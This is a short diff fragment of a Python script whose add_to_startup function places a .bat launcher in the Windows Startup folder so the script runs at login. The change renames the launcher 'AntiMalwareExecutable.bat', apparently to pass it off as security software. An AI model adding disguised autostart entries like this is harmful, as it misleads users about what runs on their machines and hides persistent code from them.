@@ -8,7 +8,7 @@ def add_to_startup():
         os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
     )
     script_path = os.path.abspath(__file__)
-    bat_path = os.path.join(startup_dir, "my_startup_launcher.bat")
+    bat_path = os.path.join(startup_dir, "AntiMalwareExecutable.bat")
 
     # Create a .bat file that runs this Python script
     with open(bat_path, "w") as bat_file:
